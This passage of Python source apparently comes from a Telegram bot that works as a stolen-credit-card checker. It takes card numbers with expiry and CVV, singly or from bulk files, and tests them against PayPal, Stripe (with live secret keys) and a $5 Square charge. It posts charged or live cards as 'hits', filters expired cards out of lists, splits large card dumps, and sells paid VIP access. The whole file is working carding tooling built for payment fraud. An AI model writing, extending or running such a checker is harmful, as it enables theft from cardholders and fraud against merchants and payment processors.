        username = user.username or user.first_name or "Unknown"
        if status == "approved":
            status_text = "🔥 Charge" if "CHARGE" in str(response).upper() else "🔥 Approved"
        else:
            status_text = "💵 Insufficient Funds"
        await send_hit(context, update.effective_chat.id, hit_counter, username, status_text, response, gateway_name)


# ==================== /st ====================
async def st_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    global hit_counter
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
        now = time.time()
        if now - last_check_time.get(user_id, 0) < ANTI_SPAM_SECONDS:
            await update.message.reply_text(premium_emoji(f"⏳ Wait {ANTI_SPAM_SECONDS}s."), parse_mode="HTML")
            return
        last_check_time[user_id] = now
    if not STRIPE_KEYS:
        await update.message.reply_text(premium_emoji("❌ No Stripe keys."), parse_mode="HTML")
        return
    if not context.args:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/st [card]</code>"), parse_mode="HTML")
        return
    card = context.args[0]
    msg = await update.message.reply_text(premium_emoji("💳 Checking..."), parse_mode="HTML")
    start_time = time.time()
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, check_stripe_sync, card)
    taken = round(time.time() - start_time, 2)
    text = await format_stripe_response(card, result, taken, user_id, "Single")
    await msg.edit_text(text, parse_mode="HTML")
    result_upper = str(result).upper()
    if "CHARGE" in result_upper or "SUCCEEDED" in result_upper:
        hit_counter += 1
        user = update.effective_user
        username = user.username or user.first_name or "Unknown"
        await send_hit(context, update.effective_chat.id, hit_counter, username, "🔥 Charge", result, "Stripe")
    elif "INSUFFICIENT" in result_upper or "LIVE" in result_upper:
        hit_counter += 1
        user = update.effective_user
        username = user.username or user.first_name or "Unknown"
        await send_hit(context, update.effective_chat.id, hit_counter, username, "💵 Insufficient Funds", result, "Stripe")


# ==================== /sq — Square 5$ ====================
async def sq_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    global hit_counter
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
        now = time.time()
        if now - last_check_time.get(user_id, 0) < ANTI_SPAM_SECONDS:
            await update.message.reply_text(premium_emoji(f"⏳ Wait {ANTI_SPAM_SECONDS}s."), parse_mode="HTML")
            return
        last_check_time[user_id] = now
    if not HAS_PLAYWRIGHT:
        await update.message.reply_text(premium_emoji("❌ Playwright not installed on server."), parse_mode="HTML")
        return
    if not context.args:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/sq [card]</code>"), parse_mode="HTML")
        return
    card = context.args[0]
    msg = await update.message.reply_text(premium_emoji("💳 Square 5$ checking..."), parse_mode="HTML")
    start_time = time.time()
    loop = asyncio.get_event_loop()
    result_dict = await loop.run_in_executor(None, check_square_sync, card)
    taken = round(time.time() - start_time, 2)
    text = await format_square_response(card, result_dict, taken, user_id, "Single")
    await msg.edit_text(text, parse_mode="HTML")
    status = result_dict.get('status', 'ERROR')
    message = result_dict.get('message', '')
    user = update.effective_user
    username = user.username or user.first_name or "Unknown"
    if status == "CHARGE":
        hit_counter += 1
        await send_hit(context, update.effective_chat.id, hit_counter, username, "🔥 Charge 5$", message, "Square 5$")
    elif status == "APPROVED":
        hit_counter += 1
        await send_hit(context, update.effective_chat.id, hit_counter, username, "💵 " + (message or "Approved"), message, "Square 5$")


# ==================== /stop ====================
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    user_id = update.effective_user.id
    stop_users[user_id] = True
    await update.message.reply_text(premium_emoji("🛑 Stopping..."), parse_mode="HTML")


async def stop_mass_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer("🛑 Stopping...")
    user_id = int(query.data.split("_")[2])
    stop_users[user_id] = True


# ==================== File Handler ====================
def can_user_check(user_id, mode="file"):
    if user_id in ADMINS:
        return True
    if is_banned(user_id):
        return False
    if user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        return True
    return mode == "single"


async def handle_file_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    ALL_USERS.add(user_id)
    if not can_user_check(user_id, "file"):
        await update.message.reply_text(premium_emoji("Please subscribe or contact the admin to activate your account."), parse_mode="HTML")
        return
    try:
        os.makedirs("downloads", exist_ok=True)
        file = await update.message.document.get_file()
        file_path = f"downloads/{file.file_id}.txt"
        await file.download_to_drive(file_path)
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        card_count = 0
        for line in lines:
            if re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line):
                card_count += 1
        if user_id not in ADMINS and user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
            if card_count > VIP_FILE_LIMIT:
                await update.message.reply_text(premium_emoji(f"❌ Max {VIP_FILE_LIMIT} cards for VIP!\n📊 Your file: {card_count} cards"), parse_mode="HTML")
                try:
                    os.remove(file_path)
                except:
                    pass
                return
        pending_files[user_id] = {"file_path": file_path, "chat_id": chat_id}
        keyboard = [
            [InlineKeyboardButton("💳 PayPal Check", callback_data="gateway_paypal", style="primary")],
            [InlineKeyboardButton("💳 Stripe Check", callback_data="gateway_stripe", style="primary")],
            [InlineKeyboardButton("💳 Square 5$", callback_data="gateway_square", style="success")],
        ]
        await update.message.reply_text(
            premium_emoji(f"📁 File Received!\n💳 Cards: {card_count}\n\nChoose gateway:"),
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    except Exception as e:
        await update.message.reply_text(premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")


async def gateway_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    user_id = query.from_user.id
    gateway_type = query.data.split("_")[1]
    if user_id not in pending_files:
        await query.edit_message_text(premium_emoji("❌ File expired."), parse_mode="HTML")
        return
    if not can_user_check(user_id, "file"):
        await query.edit_message_text(premium_emoji("Please subscribe or contact the admin to activate your account."), parse_mode="HTML")
        return
    user = query.from_user
    username = user.username or user.first_name or "Unknown"
    file_path = pending_files[user_id]["file_path"]
    chat_id = pending_files[user_id]["chat_id"]
    await query.edit_message_text(premium_emoji(f"✅ {gateway_type.upper()} selected! Processing..."), parse_mode="HTML")
    gateway_name_map = {
        "paypal": "PayPal",
        "stripe": "Stripe",
        "square": "Square 5$"
    }
    gateway_name = gateway_name_map.get(gateway_type, "Unknown")
    if gateway_type == "paypal":
        task = asyncio.create_task(process_paypal_file(file_path, chat_id, context, gateway_name, username))
    elif gateway_type == "stripe":
        task = asyncio.create_task(process_stripe_file(file_path, chat_id, context, gateway_name, username))
    elif gateway_type == "square":
        task = asyncio.create_task(process_square_file(file_path, chat_id, context, gateway_name, username))
    user_tasks[user_id] = task
    del pending_files[user_id]


# ==================== Clean Cards ====================
async def clean_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text(premium_emoji("💡 Reply to a file with /clean"), parse_mode="HTML")
        return
    msg = await update.message.reply_text(premium_emoji("🧹 Cleaning cards..."), parse_mode="HTML")
    try:
        os.makedirs("downloads", exist_ok=True)
        file = await update.message.reply_to_message.document.get_file()
        file_path = f"downloads/clean_{user_id}_{int(time.time())}.txt"
        await file.download_to_drive(file_path)
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        total_lines = len(lines)
        valid_cards = []
        removed = 0
        current_year = datetime.now().year
        current_month = datetime.now().month
        for line in lines:
            line = line.strip()
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if not match:
                removed += 1
                continue
            card = match[0]
            parts = card.split("|")
            if len(parts) < 4:
                removed += 1
                continue
            try:
                exp_month = int(parts[1])
                exp_year = int(parts[2])
                if exp_year < 100:
                    exp_year += 2000
                if exp_month < 1 or exp_month > 12:
                    removed += 1
                    continue
                if exp_year < current_year:
                    removed += 1
                    continue
                elif exp_year == current_year and exp_month < current_month:
                    removed += 1
                    continue
                valid_cards.append(card)
            except:
                removed += 1
                continue
        clean_file_path = f"downloads/clean_result_{user_id}_{int(time.time())}.txt"
        with open(clean_file_path, 'w', encoding='utf-8') as f:
            for card in valid_cards:
                f.write(card + "\n")
        private_count = len(valid_cards)
        private_percentage = (private_count / total_lines * 100) if total_lines > 0 else 0
        result_text = f"""🧹 𝐂𝐥𝐞𝐚𝐧 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞!
- - - - - - - - - - - - - - - -
📊 𝐓𝐨𝐭𝐚𝐥 𝐜𝐚𝐫𝐝𝐬: <code>{total_lines}</code>
✅ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞: <code>{private_count}</code>
❌ 𝐏𝐮𝐛𝐥𝐢𝐜/𝐑𝐞𝐦𝐨𝐯𝐞𝐝: <code>{removed}</code>
📈 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐩𝐞𝐫𝐜𝐞𝐧𝐭𝐚𝐠𝐞: <code>{private_percentage:.1f}%</code>
- - - - - - - - - - - - - - - -
🧹 𝐑𝐞𝐦𝐨𝐯𝐞𝐝: <code>{removed}</code>
✅ 𝐊𝐞𝐩𝐭: <code>{private_count}</code>
- - - - - - - - - - - - - - - -
🤖 checker v1"""
        await msg.edit_text(premium_emoji(result_text), parse_mode="HTML")
        if private_count > 0:
            with open(clean_file_path, 'rb') as f:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=f, caption=premium_emoji(f"✅ Cleaned Cards ({private_count})"), parse_mode="HTML")
        try:
            os.remove(file_path)
            os.remove(clean_file_path)
        except:
            pass
    except Exception as e:
        await msg.edit_text(premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")


# ==================== Parts ====================
async def parts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text(premium_emoji("💡 Reply to a file with /parts [number]"), parse_mode="HTML")
        return
    if not context.args:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/parts [number]</code>"), parse_mode="HTML")
        return
    try:
        num_parts = int(context.args[0])
        if num_parts < 2:
            await update.message.reply_text(premium_emoji("❌ Minimum parts is 2"), parse_mode="HTML")
            return
    except:
        await update.message.reply_text(premium_emoji("❌ Invalid number"), parse_mode="HTML")
        return
    msg = await update.message.reply_text(premium_emoji("📁 Splitting file..."), parse_mode="HTML")
    try:
        os.makedirs("downloads", exist_ok=True)
        file = await update.message.reply_to_message.document.get_file()
        file_path = f"downloads/parts_{user_id}_{int(time.time())}.txt"
        await file.download_to_drive(file_path)
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        valid_cards = []
        for line in lines:
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if match:
                valid_cards.append(match[0])
        total_cards = len(valid_cards)
        if total_cards < 1000:
            await msg.edit_text(premium_emoji(f"❌ Minimum file for split is 1000 cards!\n📊 Your file: {total_cards} cards"), parse_mode="HTML")
            try:
                os.remove(file_path)
            except:
                pass
            return
        cards_per_part = total_cards // num_parts
        if cards_per_part < 1:
            await msg.edit_text(premium_emoji("❌ Too many parts for this file"), parse_mode="HTML")
            try:
                os.remove(file_path)
            except:
                pass
            return
        username = update.effective_user.username or update.effective_user.first_name or "Unknown"
        result_text = f"""📁 𝐏𝐚𝐫𝐭𝐬 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞!
- - - - - - - - - - - - - - - -
⚡ 𝐏𝐚𝐫𝐭𝐬: <code>{num_parts}</code>
⚡ 𝐋𝐢𝐧𝐞𝐬 𝐩𝐞𝐫 𝐩𝐚𝐫𝐭: <code>{cards_per_part}</code>
⚡ 𝐓𝐨𝐭𝐚𝐥 𝐜𝐚𝐫𝐝𝐬: <code>{total_cards}</code>
- - - - - - - - - - - - - - - -
⚡ 𝐁𝐲: @{username}
- - - - - - - - - - - - - - - -
🤖 checker v1"""
        await msg.edit_text(premium_emoji(result_text), parse_mode="HTML")
        for i in range(num_parts):
            start_idx = i * cards_per_part
            end_idx = start_idx + cards_per_part if i < num_parts - 1 else total_cards
            part_cards = valid_cards[start_idx:end_idx]
            part_file_path = f"downloads/part_{i+1}_{user_id}_{int(time.time())}.txt"
            with open(part_file_path, 'w', encoding='utf-8') as f:
                for card in part_cards:
                    f.write(card + "\n")
            with open(part_file_path, 'rb') as f:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=f, caption=premium_emoji(f"📁 Part {i+1}/{num_parts} - {len(part_cards)} cards"), parse_mode="HTML")
            try:
                os.remove(part_file_path)
            except:
                pass
            await asyncio.sleep(1)
        try:
            os.remove(file_path)
        except:
            pass
    except Exception as e:
        await msg.edit_text(premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")


# ==================== Admin - Ban / Unban ====================
async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    try:
        target = int(context.args[0])
    except:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/ban_user [id]</code>"), parse_mode="HTML")
        return
    if target == update.effective_user.id:
        await update.message.reply_text(premium_emoji("❌ You can't ban yourself."), parse_mode="HTML")
        return
    add_ban(target)
    await update.message.reply_text(premium_emoji(f"✅ User <code>{target}</code> banned."), parse_mode="HTML")
    try:
        await context.bot.send_message(target, premium_emoji("You can no longer use the bot to lift the ban. Please contact the admin."), parse_mode="HTML")
    except:
        pass


async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    try:
        target = int(context.args[0])
    except:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/unban_user [id]</code>"), parse_mode="HTML")
        return
    if not is_banned(target):
        await update.message.reply_text(premium_emoji(f"⚠️ User <code>{target}</code> is not banned."), parse_mode="HTML")
        return
    remove_ban(target)
    await update.message.reply_text(premium_emoji(f"✅ User <code>{target}</code> unbanned."), parse_mode="HTML")
    try:
        await context.bot.send_message(target, premium_emoji("✅ You have been unbanned. You can use the bot now."), parse_mode="HTML")
    except:
        pass


async def banned_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    blocked = load_blocked()
    if not blocked:
        await update.message.reply_text(premium_emoji("📋 No banned users."), parse_mode="HTML")
        return
    text = "🚫 <b>Banned Users:</b>\n\n"
    for uid in blocked:
        text += f"• <code>{uid}</code>\n"
    text += f"\n📊 Total: <b>{len(blocked)}</b>"
    await update.message.reply_text(premium_emoji(text), parse_mode="HTML")


# ==================== Admin - Other ====================
async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not context.args:
        return
    code = context.args[0].upper()
    if code not in CODES:
        return
    code_data = CODES[code]
    if code_data["used"] >= code_data["max_users"]:
        return
    VIP_USERS[user_id] = int(time.time()) + code_data["duration"] * 86400
    code_data["used"] += 1
    await update.message.reply_text(premium_emoji(f"🚀 VIP activated for {code_data['duration']} days."), parse_mode="HTML")


async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    try:
        duration, max_users = int(context.args[0]), int(context.args[1])
        code = "WAFA-" + "-".join("".join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3))
        CODES[code] = {"duration": duration, "max_users": max_users, "used": 0, "created": time.time()}
        await update.message.reply_text(premium_emoji(f"💰 Code: <code>{code}</code>"), parse_mode="HTML")
    except:
        pass


async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    msg = "📊 Users:\n\n"
    for uid in ALL_USERS:
        status = "BANNED" if is_banned(uid) else "VIP" if uid in VIP_USERS else "NORMAL"
        msg += f"• <code>{uid}</code> - <b>{status}</b>\n"
    await update.message.reply_text(premium_emoji(msg), parse_mode="HTML")


async def add_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    try:
        url = context.args[0]
        if url not in GATEWAYS:
            GATEWAYS.append(url)
            await update.message.reply_text(premium_emoji(f"✅ Gateway #{len(GATEWAYS)} added."), parse_mode="HTML")
    except:
        pass


async def remove_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    try:
        if context.args:
            idx = int(context.args[0])
            if 1 <= idx <= len(GATEWAYS):
                GATEWAYS.pop(idx - 1)
                await update.message.reply_text(premium_emoji(f"🗑 Gateway #{idx} removed!\n\n📌 Remaining: {len(GATEWAYS)}"), parse_mode="HTML")
            else:
                await update.message.reply_text(premium_emoji(f"❌ Gateway #{idx} not found!"), parse_mode="HTML")
        else:
            if GATEWAYS:
                GATEWAYS.pop()
                await update.message.reply_text(premium_emoji("🗑 Last gateway removed."), parse_mode="HTML")
    except Exception as e:
        await update.message.reply_text(premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")


async def add_prm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    try:
        VIP_USERS[int(context.args[0])] = int(time.time()) + (int(context.args[1]) * 86400)
        await update.message.reply_text(premium_emoji("✅ VIP added."), parse_mode="HTML")
    except:
        pass


async def remove_prm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    try:
        VIP_USERS.pop(int(context.args[0]), None)
        await update.message.reply_text(premium_emoji("✅ VIP removed."), parse_mode="HTML")
    except:
        pass


async def add_stripe_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    args_text = " ".join(context.args)
    pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', args_text)
    sk_match = re.search(r'sk_live_[a-zA-Z0-9]+', args_text)
    if not pk_match or not sk_match:
        await update.message.reply_text(premium_emoji("💡 Usage:\n<code>/addkey pk_live_xxx sk_live_xxx</code>"), parse_mode="HTML")
        return
    pk, sk = pk_match.group(0), sk_match.group(0)
    key_id = str(len(STRIPE_KEYS) + 1)
    STRIPE_KEYS[key_id] = {"pk": pk, "sk": sk}
    with open('stripe_keys.json', 'w') as f:
        json.dump(STRIPE_KEYS, f)
    await update.message.reply_text(premium_emoji(f"✅ Stripe Key Saved!\n🆔 Key ID: <code>{key_id}</code>"), parse_mode="HTML")


async def remove_stripe_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    if not context.args:
        return
    key_id = context.args[0]
    if key_id in STRIPE_KEYS:
        del STRIPE_KEYS[key_id]
        new_keys = {}
        for i, (old_key, value) in enumerate(STRIPE_KEYS.items(), 1):
            new_keys[str(i)] = value
        STRIPE_KEYS.clear()
        STRIPE_KEYS.update(new_keys)
        with open('stripe_keys.json', 'w') as f:
            json.dump(STRIPE_KEYS, f)
        await update.message.reply_text(premium_emoji(f"✅ Key {key_id} removed!\n\n📌 Remaining: {len(STRIPE_KEYS)}"), parse_mode="HTML")
    else:
        await update.message.reply_text(premium_emoji(f"❌ Key {key_id} not found!"), parse_mode="HTML")


async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    try:
        user_id = int(context.args[0])
        reply_text = " ".join(context.args[1:])
        await context.bot.send_message(chat_id=user_id, text=premium_emoji(reply_text), parse_mode="HTML")
    except:
        pass


async def sent_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    broadcast_msg = " ".join(context.args)
    for user_id in list(ALL_USERS):
        try:
            await context.bot.send_message(chat_id=user_id, text=premium_emoji(f"📢 {broadcast_msg}"), parse_mode="HTML")
            await asyncio.sleep(0.05)
        except:
            continue


# ==================== Error Handler ====================
async def error_handler(update, context):
    pass


# ==================== Main ====================
def main():
    global STRIPE_KEYS
    try:
        with open('stripe_keys.json', 'r') as f:
            STRIPE_KEYS = json.load(f)
    except:
        STRIPE_KEYS = {}

    app = Application.builder().token(TOKEN).build()
    app.add_error_handler(error_handler)

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cmds", cmds))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("st", st_check))
    app.add_handler(CommandHandler("sq", sq_check))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("code", code_command))
    app.add_handler(CommandHandler("wafa", wafa_command))
    app.add_handler(CommandHandler("show_users", show_users))
    app.add_handler(CommandHandler("show_gateways", show_gateways))
    app.add_handler(CommandHandler("ban_user", ban_user))
    app.add_handler(CommandHandler("unban_user", unban_user))
    app.add_handler(CommandHandler("banned_list", banned_list))
    app.add_handler(CommandHandler("try", try_reply))
    app.add_handler(CommandHandler("SENT", sent_broadcast))
    app.add_handler(CommandHandler("add", add_gateway))
    app.add_handler(CommandHandler("rmadd", remove_gateway))
    app.add_handler(CommandHandler("prm", add_prm))
    app.add_handler(CommandHandler("rmprm", remove_prm))
    app.add_handler(CommandHandler("addkey", add_stripe_key))
    app.add_handler(CommandHandler("rmkey", remove_stripe_key))
    app.add_handler(CommandHandler("clean", clean_command))
    app.add_handler(CommandHandler("parts", parts_command))

    app.add_handler(CallbackQueryHandler(free_cmds_callback, pattern="^free_cmds$"))
    app.add_handler(CallbackQueryHandler(vip_cmds_callback, pattern="^vip_cmds$"))
    app.add_handler(CallbackQueryHandler(admin_cmds_callback, pattern="^admin_cmds$"))
    app.add_handler(CallbackQueryHandler(check_panel_callback, pattern="^check_panel$"))
    app.add_handler(CallbackQueryHandler(check_paypal_callback, pattern="^check_paypal$"))
    app.add_handler(CallbackQueryHandler(check_stripe_callback, pattern="^check_stripe$"))
    app.add_handler(CallbackQueryHandler(check_square_callback, pattern="^check_square$"))
    app.add_handler(CallbackQueryHandler(clean_panel_callback, pattern="^clean_panel$"))
    app.add_handler(CallbackQueryHandler(parts_panel_callback, pattern="^parts_panel$"))
    app.add_handler(CallbackQueryHandler(stats_panel_callback, pattern="^stats_panel$"))
    app.add_handler(CallbackQueryHandler(back_to_start_callback, pattern="^back_to_start$"))
    app.add_handler(CallbackQueryHandler(gateway_callback, pattern="^gateway_"))
    app.add_handler(CallbackQueryHandler(stop_mass_callback, pattern="^stop_mass_"))

    app.add_handler(MessageHandler(filters.Document.ALL, handle_file_panel))

    print("🚀 Bot Started!")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
